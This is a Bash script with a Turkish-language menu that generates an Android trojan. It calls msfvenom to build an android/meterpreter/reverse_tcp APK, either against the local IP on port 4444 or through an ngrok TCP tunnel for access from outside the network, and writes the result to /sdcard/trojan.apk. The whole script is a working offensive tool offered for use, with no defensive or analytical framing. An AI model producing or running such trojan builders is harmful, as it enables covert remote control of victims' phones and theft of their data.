#!/bin/bash
kontrol=$(which msfvenom |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[31m[!] \e[97mMSFVENOM BULUNAMADI"
	echo
	echo
	echo
	exit
fi
clear
echo
echo
printf "\e[31m////////////////////\e[97m TROJAN OLUŞTUR \e[31m////////////////////\e[97m"
echo
echo
echo
printf "
\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mAĞ İÇİ APK OLUŞTUR\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mAĞ DIŞI APK OLUŞTUR\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
echo
echo
if [[ $secim == 1 ]];then
	kontrol=$(ifconfig |grep broadcast |awk {'print $2'} |wc -l)
	if [[ $kontrol == 1 ]];then
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m İP ADRESİ ADRESİ ALINIYOR"
		echo
		echo
		echo
		sleep 0.5
		printf "\e[33m[*]\e[97m TROJAN OLUŞTURULUYOR.."
		echo
		echo
		echo
		sleep 0.5
		ip=$(ifconfig |grep broadcast |awk {'print $2'})
		echo -e "$ip\n4444" > ağ.txt
		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 R > /sdcard/trojan.apk
		echo
		echo
		printf "\e[33m[*]\e[97m TROJAN OLUŞTURULDU"
		echo
		echo
		printf "\e[33m[*]\e[97m TROJAN SDCARD İÇİNE KAYDEDİLDİ"
		echo
		echo
		echo
		exit
	fi
elif [[ $secim == 2 ]];then
	tokenkontrol() {
		if [[ -f $HOME/.ngrok2/ngrok.yml ]];then
			ngrok tcp 4444 > /dev/null &
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m İP ADRESİ ADRESİ ALINIYOR"
			echo
			echo
			echo
			sleep 15
			kontrol=$(curl -s "http://localhost:4040/status" |grep -o tcp://[a-z.0-9.A-Z.:]\* |wc -l)
			if [[ $kontrol == 0 ]];then
				echo
				echo
				echo
				printf "\e[31m[!]\e[97m TOKEN HATALI\e[31m !!!\e[97n"
				echo
				echo
				echo
				rm $HOME/.ngrok2/ngrok.yml
				tokenkontrol
				exit
			fi
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m TROJAN OLUŞTURULUYOR.."
			echo
			echo
			echo
			sleep 0.5
			curl -s "http://localhost:4040/status" |grep -o tcp://[a-z.0-9.A-Z.:]\* > tcp
			grep -o [0-9]\*.tcp.ngrok.io tcp > ağ.txt 
			grep -o :[0-9]\* tcp |tr -d ":" >> ağ.txt
			rm tcp
			ip=$(sed -n 1p ağ.txt)
			port=$(sed -n 3p ağ.txt)
			msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/trojan.apk
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m TROJAN OLUŞTURULDU"
			echo
			echo
			echo
			sleep 0.5
			printf "\e[33m[*]\e[97m TROJAN SDCARD İÇİNE KAYDEDİLDİ"
			echo
			echo
			echo
			exit

		else
			echo
			echo
			echo
			printf "\e[31m[!]\e[97m NGROK AUTHTOKEN BULUNAMADI"
			echo
			echo
			echo
			sleep 0.5
			printf "\e[33m[*]\e[97m NGROK SİTESİNE KAYIT OL"
			echo
			echo
			echo
			sleep 0.5
			printf "\e[33m[*]\e[97m TOKEN KOPYALA"
			echo
			echo
			echo
			sleep 0.5
			printf "\e[33m[*]\e[97m ALTTAKİ ÖRNEK GİBİ YAPIŞTIR\e[33m

			ÖRNEK NGROK AUTHTOKEN \e[31m>>\e[97m  1eBKrszBADat4FXdWcMOimUunsk_3Gk7W7MsUq"
			echo
			echo
			echo
			sleep 0.5
			read -e -p $'\e[97mNGROK SİTESİNE GİTMEK İÇİN\e[31m ────────── [ \e[97mENTER\e[31m ] >>\e[97m ' site
			echo
			echo
			echo
			am start -a android.intent.action.VIEW "https://dashboard.ngrok.com/signup"
			echo
			echo
			echo
			read -e -p $'\e[31m───────[ \e[97mTOKEN GİRİNİZ\e[31m ]───────►  \e[0m' token
			cd $HOME
			ngrok authtoken $token
			cd -
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m TOKEN OLUŞTURULDU LÜTFEN BEKLEYİNİZ.."
			echo
			echo
			echo
			sleep 0.5
			tokenkontrol
			exit
		fi
	}
        tokenkontrol 
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM\e[31m !!!\e[97m"
	echo
	echo
	echo
	sleep 2
	bash Trojan-oluştur.sh
fi




